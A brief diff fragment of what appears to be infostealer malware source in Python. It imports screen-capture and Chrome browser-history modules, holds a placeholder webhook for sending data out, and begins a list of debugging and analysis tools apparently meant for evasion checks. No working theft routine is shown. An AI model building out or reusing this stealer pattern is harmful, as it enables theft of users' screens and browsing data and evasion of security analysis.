@@ -4,7 +4,7 @@ import cv2
 import re, uuid
 from PIL import ImageGrab
 from browser_history.browsers import Chrome
-webhook = "Webhooksss"
+webhook = "webhook"
 process = [
     "ProcessHacker.exe",
     "httpdebuggerui.exe",
